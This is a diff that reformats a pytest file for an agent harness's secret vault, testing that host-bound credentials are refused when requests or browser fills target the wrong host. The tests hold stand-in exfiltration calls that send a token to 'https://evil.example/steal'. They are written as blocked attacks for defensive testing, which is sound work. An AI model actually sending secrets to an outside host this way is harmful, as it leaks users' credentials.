@@ -2,6 +2,7 @@
 never be injected toward any other host. The refusal is structural (in
 `SecretSink.resolve`, before anything leaves the parent) — the approval prompt
 is a confirmation, not the last line of defense."""
+
 from __future__ import annotations
 
 import pytest
@@ -82,7 +83,11 @@ def test_http_request_refuses_bound_secret_to_wrong_host(tmp_path, fake_httpx):
         http.request(None, "GET", "https://evil.example/steal", auth="gh")
     with pytest.raises(PermissionError):
         http.request(
-            None, "POST", "https://evil.example/steal", json={}, secret_fields={"t": "gh"}
+            None,
+            "POST",
+            "https://evil.example/steal",
+            json={},
+            secret_fields={"t": "gh"},
         )
     # Refused before any client existed — nothing left the machine.
     assert not any(c.calls for c in fake_httpx.instances)
@@ -101,7 +106,9 @@ def test_browser_fill_secret_checks_page_host(tmp_path):
             self.filled.append((target, value))
 
     page = _FakePage()
-    session = _BrowserSession(browser=None, context=None, page=page, sink=SecretSink(BOUND))
+    session = _BrowserSession(
+        browser=None, context=None, page=page, sink=SecretSink(BOUND)
+    )
     cap._sessions["sid"] = session
     with pytest.raises(PermissionError):
         cap.fill_secret("sid", "#password", "gh")
@@ -120,7 +127,16 @@ def test_cli_set_host_binds_and_list_shows_it(tmp_path, monkeypatch, capsys):
     monkeypatch.setenv("PYHARNESS_VAULT_PASSPHRASE", "pw")
     monkeypatch.setattr(
         "sys.argv",
-        ["pyharness-vault", "set", "gh", "tok", "--host", "api.github.com", "--host", "uploads.github.com"],
+        [
+            "pyharness-vault",
+            "set",
+            "gh",
+            "tok",
+            "--host",
+            "api.github.com",
+            "--host",
+            "uploads.github.com",
+        ],
     )
     cli_vault.main()
     monkeypatch.setattr("sys.argv", ["pyharness-vault", "list"])
